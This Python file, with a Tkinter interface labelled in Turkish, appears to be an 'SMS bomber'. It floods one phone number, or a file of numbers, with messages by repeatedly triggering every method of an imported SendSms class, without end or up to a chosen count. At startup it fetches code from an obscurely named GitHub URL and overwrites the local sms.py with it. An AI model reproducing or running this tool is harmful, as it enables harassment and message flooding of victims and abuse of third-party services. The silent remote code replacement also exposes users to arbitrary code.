# -*- coding: utf-8 -*-

from tkinter import *
from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
from requests import get
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

r = get("https://raw.githubusercontent.com/cacaicocobobo125/codeiboilordizengi025c2020i62/main/rodei/bobocai/loaded/cocoine.py").text

with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()

if read == r:
    pass
else:
    print(Fore.RED + "Güncelleme yapılıyor...")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)

from sms import SendSms
servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)

def send_sms():
    def send_button_clicked():
        tel_no = tel_entry.get()
        mail = mail_entry.get()
        kere = kere_entry.get()
        aralik = aralik_entry.get()

        tel_liste = []
        if tel_no == "":
            dizin = dizin_entry.get()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                output_text.insert(END, "Hatalı dosya dizini. Tekrar deneyiniz.\n")
                return
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  
            except ValueError:
                output_text.insert(END, "Hatalı telefon numarası. Tekrar deneyiniz.\n")
                return
        
        try:
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            output_text.insert(END, "Hatalı mail adresi. Tekrar deneyiniz.\n")
            return
        
        try:
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            output_text.insert(END, "Hatalı giriş yaptın. Tekrar deneyiniz.\n")
            return
        
        try:
            aralik = int(aralik)
        except ValueError:
            output_text.insert(END, "Hatalı giriş yaptın. Tekrar deneyiniz.\n")
            return

        output_text.delete(1.0, END)  # Log alanını temizle

        if kere is None: 
            sms = SendSms(tel_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            try:
                                exec("sms."+attribute+"()")
                                sleep(aralik)
                                output_text.insert(END, f"{attribute} denendi..\n")
                                output_text.see(END)  # Log alanını en son yazılan satıra kaydır
                                root.update()  # Arayüzü güncelle
                            except Exception as e:
                                output_text.insert(END, f"{attribute} denendi.: {str(e)}\n")
                                output_text.see(END)  # Log alanını en son yazılan satıra kaydır
                                root.update()  # Arayüzü güncelle
        for i in tel_liste:
            sms = SendSms(i, mail)
            if isinstance(kere, int):
                    while sms.adet < kere:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    if sms.adet == kere:
                                        break
                                    try:
                                        exec("sms."+attribute+"()")
                                        sleep(aralik)
                                        output_text.insert(END, f"{attribute} başarılı.\n")
                                        output_text.see(END)  # Log alanını en son yazılan satıra kaydır
                                        root.update()  # Arayüzü güncelle
                                    except Exception as e:
                                        output_text.insert(END, f"{attribute} başarısız: {str(e)}\n")
                                        output_text.see(END)  # Log alanını en son yazılan satıra kaydır
                                        root.update()  # Arayüzü güncelle

    def contact_button_clicked():
        output_text.insert(END, "Discord: yildirimlord\nTelegram: yildirimlord\n")
        output_text.see(END)  # Log alanını en son yazılan satıra kaydır / Made by yıldırımlord

    root = Tk()
    root.title("SMS Gönderme Programı")
    root.geometry("600x400")

    input_frame = Frame(root)
    input_frame.pack(side=LEFT, padx=20)

    label1 = Label(input_frame, text="Telefon Numarası:", width=15)
    label1.grid(row=0, column=0, padx=10, pady=5)
    tel_entry = Entry(input_frame, width=25)
    tel_entry.grid(row=0, column=1, padx=10, pady=5)

    label2 = Label(input_frame, text="Mail Adresi:", width=15)
    label2.grid(row=1, column=0, padx=10, pady=5)
    mail_entry = Entry(input_frame, width=25)
    mail_entry.grid(row=1, column=1, padx=10, pady=5)

    label3 = Label(input_frame, text="Kaç Adet:", width=15)
    label3.grid(row=2, column=0, padx=10, pady=5)
    kere_entry = Entry(input_frame, width=25)
    kere_entry.grid(row=2, column=1, padx=10, pady=5)

    label4 = Label(input_frame, text="Aralık (saniye):", width=15)
    label4.grid(row=3, column=0, padx=10, pady=5)
    aralik_entry = Entry(input_frame, width=25)
    aralik_entry.grid(row=3, column=1, padx=10, pady=5)

    label5 = Label(input_frame, text="Dizin:", width=15)
    label5.grid(row=4, column=0, padx=10, pady=5)
    dizin_entry = Entry(input_frame, width=25)
    dizin_entry.grid(row=4, column=1, padx=10, pady=5)

    send_button = Button(input_frame, text="SMS Gönder", command=send_button_clicked)
    send_button.grid(row=5, column=0, columnspan=2, pady=10)

    contact_button = Button(input_frame, text="İletişim", command=contact_button_clicked)
    contact_button.grid(row=6, column=0, columnspan=2, pady=10)

    output_frame = Frame(root)
    output_frame.pack(side=RIGHT, padx=20)

    output_text = Text(output_frame, width=40, height=10)
    output_text.pack()

    root.mainloop()

send_sms()
